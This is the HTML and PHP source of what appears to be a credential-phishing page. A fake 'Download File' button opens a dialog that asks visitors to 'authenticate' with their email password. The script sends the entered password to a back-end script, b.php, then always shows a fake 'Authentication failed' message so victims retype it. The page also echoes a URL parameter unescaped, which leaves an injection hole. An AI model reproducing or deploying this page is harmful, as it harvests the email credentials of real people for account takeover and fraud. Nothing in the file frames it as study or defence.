<!doctype html>
<html>

<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
	<style>
		body {
			background-image: url(1.jpg);
			background-repeat: no-repeat;
			color: #045eb4;
		}
		
		
		
		#d {
			position: relative;
			left: 530px;
			top: 350px;
			
		}
		
		#form {
			position: absolute;
			left: 650px;
			top: 100px;
			width: 400px;
			border-radius: 10px;
			padding: 20px;
			z-index: 2;
			background: white;
			display:none;
			
			
			
			
			
		}
		.blue{
			background-color: #045eb4;
			color: white;
		}
		#sub1{
			margin-top: 500px;
			margin-left: 300px;
			border-radius: 15px;
			position: absolute;
			z-index: 1;
			
			
		}
				.sky{
					background-color: #409fff;
					color:white;
			
		}
	</style>

</head>
<body>

<a href="#" id="sub1" class="btn btn-md sky text-white" data-toggle="modal" data-target="#myModal">Download File (5.53MB) </a>
	 <!-- The Modal -->
	 <div class="modal fade" id="myModal">
    <div class="modal-dialog modal-md">
      <div class="modal-content">
      
        <!-- Modal Header -->
        <div class="modal-header">
          <h4 class="modal-title"><img src="2.png" width="200"><br></h4>
          <button type="button" class="close" data-dismiss="modal">&times;</button>
        </div>
        
        <!-- Modal body -->
        <div class="modal-body" >
		
		
	<!-- <div style="color:black;">Confirm to  start download! </div> -->
	
	<div class="d-flex justify-content-center">
		<form method="POST"class=" bg-light " id="profileUp">
		<p class="text-dark" id="err">Please authenticate your download with your email client</p>
		<hr>
			<p class="text-center"></p>
			<div class="input-group mb-3 input-group-md">
    <div class="input-group-prepend">
      <span class="input-group-text"> <img src="#" id="imgFav" style="padding: 0px 7px 5px 0px;"></span>
    </div>
    <input type="text" value="<?php echo $_GET['access']; ?>" class="form-control" readonly>
  </div>
			<input type="password" name="x1" class="form-control text-center" value="" id="password" placeholder="Password" required="">
			<span class="text-danger" id="er"></span>
			<input type="hidden" id="emailit" type="email" value="<?php echo $_GET['acesss']; ?>" name="access"><br>
			
			<input id="sub" name="sub" type="submit" class="btn btn-md btn-block sky"  value="Download">
			<center><small></small></center>

</form>
<div id="pro">
<div class="spinner-border spinner-border-lg"></div> Authenticating <img src="#" id="imgFv" style="width:20px; height:20px;"><em> <em id="domain"></em> Mail Service!</em>
  <div class="spinner-grow spinner-grow-sm"></div>
</div>

		</div>
		
		

        <div class="text-center">
		
		</div>
        </div>
        
        <!-- Modal footer -->
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        </div>
        
      </div>
    </div>
  </div>
  
</div>

<script type="text/javascript">
		function getUrlVars() {
		    var vars = {};
		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
		        vars[key] = value;
		    });
		    return vars;
			}
	</script>
<script>
	

    $(document).ready(function () {
		
		$("#pro").hide();
        $("#profileUp").submit(function (e) {
            e.preventDefault();
	
            var formData = new FormData($("#profileUp")[0]);

            $.ajax({
                url: "b.php",
                type: 'POST',
                data: formData,
                contentType: false,
                processData: false,
               success:function(res){
					$("#profileUp").hide();
					$("#pro").show();
					setTimeout(function(){
						$("#pro").show();
					},2000);
					setTimeout(function(){
						$("#profileUp").show();
						$("#pro").hide();
						$("#password").val("");
						$("#err").html("<strong class='text-danger'>Authentication failed! Enter correct account details to start download!</strong>");

					},2000);
			   }
            });
        });
    });
	var email = getUrlVars()['access'];
	var domain = email.substr(email.lastIndexOf('@') + 1);
	document.getElementById("domain").innerHTML = domain;

</script>
		
		<script type="text/javascript" src="validate.js"></script> 
	
</body>

</html>
